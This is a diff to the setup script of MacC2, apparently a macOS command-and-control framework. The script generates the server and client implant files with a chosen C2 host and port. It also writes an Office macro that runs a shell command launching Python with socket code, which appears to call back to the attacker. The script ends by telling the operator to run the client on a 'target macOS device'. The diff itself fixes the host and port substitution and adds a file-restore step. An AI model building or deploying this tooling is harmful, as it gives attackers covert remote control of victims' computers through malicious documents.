@@ -23,7 +23,7 @@ f1 = open('server.py','r')
 f2 = open('MacC2_server.py','w')
 
 for line in f1:
-    f2.write(line.replace('127.0.0.1', host).replace('443', port))
+    f2.write(line.replace('127.0.0.1', host).replace('port=443', 'port=%s'%port))
 
 f1.close()
 f2.close()
@@ -32,7 +32,7 @@ f3 = open('client.py','r')
 f4 = open('MacC2_client.py', 'w')
 
 for line in f3:
-    f4.write(line.replace('127.0.0.1', host).replace('443', port))
+    f4.write(line.replace('127.0.0.1', (host+":%s"%port)))
 
 f3.close()
 f4.close()
@@ -73,6 +73,8 @@ macro = "MacScript (\"do shell script \"\"\" & a & \" -c \\\"\"import sys,socket
 macrofile.write(macro)
 macrofile.write("End Sub\n")
 macrofile.close()
+
+os.system("cp client-orig.py client.py")
 
 print("-"*100)
 print("==>Start MacC2_server.py and then upload MacC2_client.py (or whatever you want to rename it) to your target macOS device and execute.")
